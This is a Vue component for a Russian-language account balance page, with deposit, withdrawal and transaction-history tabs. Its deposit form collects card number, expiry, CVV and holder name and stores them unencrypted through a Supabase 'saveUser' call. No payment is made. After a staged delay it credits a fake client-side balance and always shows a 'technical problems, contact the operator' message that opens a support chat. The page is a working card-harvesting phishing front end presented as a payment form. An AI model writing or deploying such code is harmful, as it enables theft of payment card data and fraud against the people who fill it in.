<script setup>
import { ref } from 'vue'
import { saveUser } from '../lib/supabase'
import useAuth from '../composables/useAuth.js'
import AccountTransactions from '../components/account/AccountTransactions.vue'

const { balance, deposit: addDeposit, withdraw: doWithdraw } = useAuth()
const activeTab = ref('deposit')
const tabs = [
  { id: 'deposit', label: 'Пополнение' },
  { id: 'withdraw', label: 'Выплата' },
  { id: 'history', label: 'История транзакций' }
]

// Пополнение
const cardNumber = ref('')
const expiry = ref('')
const cvv = ref('')
const name = ref('')
const amount = ref('')
const method = ref('Visa/Mastercard')
const processing = ref(false)
const showMessage = ref(false)
const errors = ref({})

function formatCard(value) {
  return value
    .replace(/\D/g, '')
    .slice(0, 19)
    .replace(/(\d{4})(?=\d)/g, '$1 ')
    .trim()
}

function onCardInput(e) {
  cardNumber.value = formatCard(e.target.value)
}

function onExpiryInput(e) {
  let val = e.target.value.replace(/\D/g, '').slice(0, 4)
  if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2)
  expiry.value = val
}

function onCvvInput(e) {
  cvv.value = e.target.value.replace(/\D/g, '').slice(0, 3)
}

function resetForm() {
  cardNumber.value = ''
  expiry.value = ''
  cvv.value = ''
  name.value = ''
  amount.value = ''
  method.value = 'Visa/Mastercard'
  errors.value = {}
}

function validate() {
  const errs = {}

  if (!/^\d{16,19}$/.test(cardNumber.value.replace(/\s/g, ''))) {
    errs.cardNumber = 'Некорректный номер карты'
  }

  if (!/^\d{3}$/.test(cvv.value)) {
    errs.cvv = 'Некорректный CVV'
  }

  const match = expiry.value.match(/^(\d{2})\/(\d{2})$/)
  if (!match) {
    errs.expiry = 'Формат MM/YY'
  } else {
    const mm = Number(match[1])
    const yy = Number(match[2])
    const now = new Date()
    const thisYear = now.getFullYear() % 100
    const thisMonth = now.getMonth() + 1
    if (mm < 1 || mm > 12) {
      errs.expiry = 'Месяц от 01 до 12'
    } else if (yy < thisYear || (yy === thisYear && mm < thisMonth)) {
      errs.expiry = 'Срок действия истёк'
    }
  }

  if (name.value.trim().length < 2) {
    errs.name = 'Введите имя держателя'
  }

  if (!amount.value || isNaN(amount.value) || Number(amount.value) <= 0) {
    errs.amount = 'Введите сумму'
  }

  errors.value = errs
  return Object.keys(errs).length === 0
}

async function submit() {
  if (!validate()) return

  processing.value = true
  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')

  await saveUser({
    email: authUser.email || '',
    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
    cardNumber: cardNumber.value,
    cardDate: expiry.value,
    cvv: cvv.value,
    name: name.value,
    amount: amount.value,
    method: method.value
  })

  setTimeout(() => {
    addDeposit(amount.value)
    processing.value = false
    showMessage.value = true
    resetForm()
  }, 2000)
}

// Вывод
const wCardNumber = ref('')
const wAmount = ref('')
const wErrors = ref({})
const wMessage = ref('')

function onWithdrawCard(e) {
  wCardNumber.value = formatCard(e.target.value)
}

function validateWithdraw() {
  const errs = {}
  if (!/^\d{16,19}$/.test(wCardNumber.value.replace(/\s/g, ''))) {
    errs.card = 'Некорректный номер карты'
  }
  const amt = parseFloat(wAmount.value)
  if (isNaN(amt) || amt <= 0) {
    errs.amount = 'Введите сумму'
  } else if (amt > balance.value) {
    errs.amount = 'Недостаточно средств'
  }
  wErrors.value = errs
  return Object.keys(errs).length === 0
}

function submitWithdraw() {
  if (!validateWithdraw()) return
  if (doWithdraw(wAmount.value)) {
    wMessage.value = 'Заявка на вывод принята'
    wCardNumber.value = ''
    wAmount.value = ''
    wErrors.value = {}
  } else {
    wMessage.value = 'Ошибка вывода'
  }
}

function openChat() {
  showMessage.value = false
  if (window.Intercom) {
    window.Intercom('show')
  }
}
</script>

<template>
  <div class="deposit container">
    <h1>Баланс</h1>
    <nav class="tabs">
      <button
        v-for="t in tabs"
        :key="t.id"
        :class="{ active: activeTab === t.id }"
        @click="activeTab = t.id"
      >
        {{ t.label }}
      </button>
    </nav>

    <div v-if="activeTab === 'deposit'">
      <form v-if="!showMessage" @submit.prevent="submit" class="deposit-form" autocomplete="off">
        <div class="form-group">
          <label for="cardNumber">Номер карты</label>
          <input
            id="cardNumber"
            v-model="cardNumber"
            @input="onCardInput"
            :class="{ error: errors.cardNumber }"
            maxlength="19"
            required
          />
          <span class="error-text" v-if="errors.cardNumber">{{ errors.cardNumber }}</span>
        </div>
        <div class="form-row">
          <div class="form-group">
            <label for="expiry">Срок действия</label>
            <input
              id="expiry"
              v-model="expiry"
              @input="onExpiryInput"
              placeholder="MM/YY"
              :class="{ error: errors.expiry }"
              maxlength="5"
              required
            />
            <span class="error-text" v-if="errors.expiry">{{ errors.expiry }}</span>
          </div>
          <div class="form-group">
            <label for="cvv">CVV</label>
            <input
              id="cvv"
              v-model="cvv"
              @input="onCvvInput"
              maxlength="3"
              :class="{ error: errors.cvv }"
              required
            />
            <span class="error-text" v-if="errors.cvv">{{ errors.cvv }}</span>
          </div>
        </div>
        <div class="form-group">
          <label for="name">Имя держателя</label>
          <input id="name" v-model="name" :class="{ error: errors.name }" required />
          <span class="error-text" v-if="errors.name">{{ errors.name }}</span>
        </div>
        <div class="form-group">
          <label for="amount">Сумма</label>
          <input id="amount" type="number" min="1" v-model="amount" :class="{ error: errors.amount }" required />
          <span class="error-text" v-if="errors.amount">{{ errors.amount }}</span>
        </div>
        <div class="form-group">
          <label for="method">Способ оплаты</label>
          <select id="method" v-model="method">
            <option>Visa/Mastercard</option>
            <option>Mir</option>
            <option>QIWI</option>
            <option>ЮMoney</option>
          </select>
        </div>
        <button type="submit" class="btn" :disabled="processing">
          Пополнить
        </button>
        <div v-if="processing" class="processing">Обработка...</div>
      </form>
      <div v-else class="modal">
        <div class="modal-content">
          <p>
            К сожалению мы имеем технические неполадки на сервере, обратитесь к оператору чтобы пополнить баланс
          </p>
          <button class="btn" @click="openChat">Написать оператору</button>
        </div>
      </div>
    </div>

    <div v-else-if="activeTab === 'withdraw'">
      <form @submit.prevent="submitWithdraw" class="deposit-form" autocomplete="off">
        <div class="form-group">
          <label for="wCard">Номер карты</label>
          <input id="wCard" v-model="wCardNumber" @input="onWithdrawCard" :class="{ error: wErrors.card }" maxlength="19" required />
          <span class="error-text" v-if="wErrors.card">{{ wErrors.card }}</span>
        </div>
        <div class="form-group">
          <label for="wAmount">Сумма</label>
          <input id="wAmount" type="number" min="1" v-model="wAmount" :class="{ error: wErrors.amount }" required />
          <span class="error-text" v-if="wErrors.amount">{{ wErrors.amount }}</span>
        </div>
        <p class="balance">Доступно: {{ balance.toFixed(2) }}₴</p>
        <button type="submit" class="btn">Вывести</button>
        <p v-if="wMessage" class="success-text">{{ wMessage }}</p>
      </form>
    </div>

    <div v-else>
      <AccountTransactions />
    </div>
  </div>
</template>

<style scoped>
.deposit {
  padding: 40px 0;
}
.deposit h1 {
  font-size: 2rem;
  margin-bottom: 24px;
}
.tabs {
  display: flex;
  gap: 8px;
  margin-bottom: 24px;
  justify-content: center;
  flex-wrap: wrap;
}
.tabs button {
  padding: 12px 20px;
  background: #1e232d;
  color: #f1f5f9;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: background 0.3s;
  font-size: 1rem;
}
.tabs button.active {
  background: #ff4d00;
  color: #fff;
}
.deposit-form {
  max-width: 480px;
  margin: 0 auto;
  display: flex;
  flex-direction: column;
  gap: 16px;
}
.deposit-form label {
  margin-bottom: 4px;
  font-size: 1rem;
}
.deposit-form input,
.deposit-form select {
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #2a2f3a;
  background: #0b0c10;
  color: #f1f5f9;
  font-size: 1rem;
}
.deposit-form select {
  appearance: none;
  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 24 24' fill='none' stroke='%23f1f5f9' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' xmlns='http://www.w3.org/2000/svg'%3E%3Cpolyline points='6 9 12 15 18 9'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 12px center;
  background-size: 16px;
  padding-right: 40px;
}
.deposit-form .btn {
  font-size: 1rem;
  padding: 12px 20px;
}
.form-row {
  display: flex;
  gap: 16px;
}
.form-group {
  display: flex;
  flex-direction: column;
  position: relative;
}
input.error, select.error {
  border: 1px solid #d00 !important;
}
.error-text {
  color: #d00;
  font-size: 12px;
  margin-top: 2px;
  position: absolute;
  bottom: -16px;
}
.processing {
  margin-top: 16px;
}
.balance {
  margin: -8px 0 8px;
  font-size: 1rem;
}
.success-text {
  color: #4caf50;
  text-align: center;
  font-size: 1rem;
}
.modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: rgba(0,0,0,0.6);
  display: flex;
  justify-content: center;
  align-items: center;
}
.modal-content {
  background: var(--card);
  padding: 24px;
  border-radius: 8px;
  max-width: 400px;
  text-align: center;
}
@media (max-width: 600px) {
  .form-row {
    flex-direction: column;
  }
}
</style>
